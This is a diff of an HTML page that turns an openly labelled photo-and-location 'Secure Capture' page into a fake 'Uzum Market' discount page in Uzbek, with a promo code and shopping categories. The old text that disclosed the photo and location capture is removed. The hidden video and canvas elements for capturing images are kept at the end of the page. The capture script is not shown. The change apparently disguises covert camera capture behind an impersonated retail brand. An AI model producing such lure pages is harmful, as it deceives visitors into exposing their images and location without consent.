@@ -4,28 +4,464 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Capture</title>
+    <title>Uzum Market - Special Offers</title>
     <!-- Bootstrap CSS -->
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
+        * {
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background: #f8f9fa;
+            padding: 0;
+            margin: 0;
+        }
+
         #video {
             display: none;
         }
 
-        .container {
-            max-width: 600px;
-            margin-top: 50px;
+        /* Header */
+        .top-header {
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 15px 0;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #7000ff;
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: #333;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #7000ff;
+        }
+
+        /* Hero Section */
+        .hero-section {
+            background: linear-gradient(to right, #7000ff, #a040ff);
+            color: white;
+            padding: 60px 0;
+            margin-bottom: 40px;
+        }
+
+        .hero-content h1 {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .hero-content p {
+            font-size: 18px;
+            font-weight: 300;
+            margin-bottom: 30px;
+            opacity: 0.95;
+        }
+
+        .promo-display {
+            background: white;
+            color: #333;
+            padding: 20px 30px;
+            border-radius: 8px;
+            display: inline-block;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .promo-label {
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .promo-code {
+            font-size: 32px;
+            font-weight: 700;
+            color: #7000ff;
+            letter-spacing: 2px;
+        }
+
+        /* Categories Section */
+        .categories-section {
+            padding: 40px 0;
+        }
+
+        .section-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .category-card {
+            background: white;
+            border-radius: 8px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-bottom: 20px;
+            height: 100%;
+        }
+
+        .category-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
+        }
+
+        .category-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .category-card h5 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .discount-text {
+            color: #7000ff;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .category-desc {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        /* Benefits Section */
+        .benefits-section {
+            background: white;
+            padding: 50px 0;
+            margin: 40px 0;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: start;
+            margin-bottom: 25px;
+        }
+
+        .benefit-icon {
+            font-size: 32px;
+            margin-right: 20px;
+            min-width: 40px;
+        }
+
+        .benefit-content h6 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .benefit-content p {
+            font-size: 14px;
+            color: #666;
+            margin: 0;
+        }
+
+        /* CTA Button */
+        .cta-btn {
+            background: #7000ff;
+            color: white;
+            padding: 14px 40px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .cta-btn:hover {
+            background: #5c00d6;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f1f1f1;
+            padding: 30px 0;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .top-header {
+                padding: 12px 0;
+            }
+
+            .logo {
+                font-size: 24px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .hero-section {
+                padding: 40px 0;
+            }
+
+            .hero-content h1 {
+                font-size: 28px;
+                margin-bottom: 12px;
+            }
+
+            .hero-content p {
+                font-size: 16px;
+                margin-bottom: 20px;
+            }
+            
+            .promo-display {
+                padding: 15px 20px;
+            }
+
+            .promo-label {
+                font-size: 11px;
+            }
+
+            .promo-code {
+                font-size: 24px;
+                letter-spacing: 1px;
+            }
+
+            .section-title {
+                font-size: 24px;
+                margin-bottom: 20px;
+            }
+
+            .categories-section {
+                padding: 30px 0;
+            }
+
+            .category-card {
+                padding: 25px 15px;
+                margin-bottom: 15px;
+            }
+
+            .category-icon {
+                font-size: 40px;
+                margin-bottom: 12px;
+            }
+
+            .category-card h5 {
+                font-size: 16px;
+            }
+
+            .discount-text {
+                font-size: 20px;
+            }
+
+            .category-desc {
+                font-size: 13px;
+            }
+
+            .benefits-section {
+                padding: 40px 0;
+            }
+
+            .benefit-item {
+                margin-bottom: 20px;
+            }
+
+            .benefit-icon {
+                font-size: 28px;
+                margin-right: 15px;
+                min-width: 35px;
+            }
+
+            .benefit-content h6 {
+                font-size: 15px;
+            }
+
+            .benefit-content p {
+                font-size: 13px;
+            }
+
+            .cta-btn {
+                width: 100%;
+                padding: 16px 30px;
+                font-size: 16px;
+            }
+
+            .footer {
+                padding: 25px 15px;
+                font-size: 13px;
+            }
+
+            .footer p {
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero-content h1 {
+                font-size: 24px;
+            }
+
+            .hero-content p {
+                font-size: 14px;
+            }
+
+            .promo-code {
+                font-size: 20px;
+            }
+
+            .section-title {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="container text-center">
-        <h1 class="my-4">Capture & Secure</h1>
-        <p class="lead">This application will take your photo and request your location for secure purposes.</p>
-        <video id="video" autoplay></video>
-        <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <!-- Header -->
+    <div class="top-header">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="#" class="logo">UZUM</a>
+                <div class="nav-links">
+                    <a href="#">Katalog</a>
+                    <a href="#">Aksiyalar</a>
+                    <a href="#">Uzum Market</a>
+                    <a href="#">Yordam</a>
+                </div>
+            </div>
+        </div>
     </div>
+
+    <!-- Hero Section -->
+    <div class="hero-section">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-8">
+                    <div class="hero-content">
+                        <h1>Maxsus chegirmalar faqat bugun!</h1>
+                        <p>Barcha toifalar bo'yicha 50% gacha chegirma olish imkoniyati. Promo-kodni ro'yxatdan o'tishda kiriting va tejang.</p>
+                        <div class="promo-display">
+                            <div class="promo-label">Sizning promo-kodingiz</div>
+                            <div class="promo-code">UZUM50</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Categories -->
+    <div class="categories-section">
+        <div class="container">
+            <h2 class="section-title">Chegirmalar kategoriyalar bo'yicha</h2>
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="category-card">
+                        <div class="category-icon">📱</div>
+                        <h5>Elektronika</h5>
+                        <div class="discount-text">30% gacha</div>
+                        <p class="category-desc">Smartfonlar, planshetlar va aksessuarlar</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="category-card">
+                        <div class="category-icon">👗</div>
+                        <h5>Moda va kiyim</h5>
+                        <div class="discount-text">40% gacha</div>
+                        <p class="category-desc">Erkaklar va ayollar uchun kiyimlar</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="category-card">
+                        <div class="category-icon">🏠</div>
+                        <h5>Uy uchun</h5>
+                        <div class="discount-text">50% gacha</div>
+                        <p class="category-desc">Mebel, dekor va maishiy texnika</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Benefits -->
+    <div class="benefits-section">
+        <div class="container">
+            <h2 class="section-title">Nima uchun Uzum Market?</h2>
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🚚</div>
+                        <div class="benefit-content">
+                            <h6>Bepul yetkazib berish</h6>
+                            <p>100,000 so'mdan yuqori buyurtmalar uchun bepul yetkazib berish xizmati</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">💳</div>
+                        <div class="benefit-content">
+                            <h6>Bo'lib to'lash</h6>
+                            <p>Qulay to'lov shartlari, 3-12 oyga bo'lib to'lash imkoniyati</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">✅</div>
+                        <div class="benefit-content">
+                            <h6>Kafolat va sifat</h6>
+                            <p>Barcha mahsulotlar rasmiy kafolat bilan ta'minlanadi</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="benefit-item">
+                        <div class="benefit-icon">🎁</div>
+                        <div class="benefit-content">
+                            <h6>Cashback dasturi</h6>
+                            <p>Har bir xaridingiz uchun bonus ballar to'plang</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="text-center mt-4">
+                <button class="cta-btn">Xarid qilishni boshlash</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="container">
+            <p>© 2024 Uzum Market. Barcha huquqlar himoyalangan.</p>
+            <p style="margin: 0; font-size: 12px;">Promo-kod faqat birinchi xarid uchun amal qiladi. Shartlar va qoidalar qo'llaniladi.</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
     <!-- Bootstrap JS and dependencies -->
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
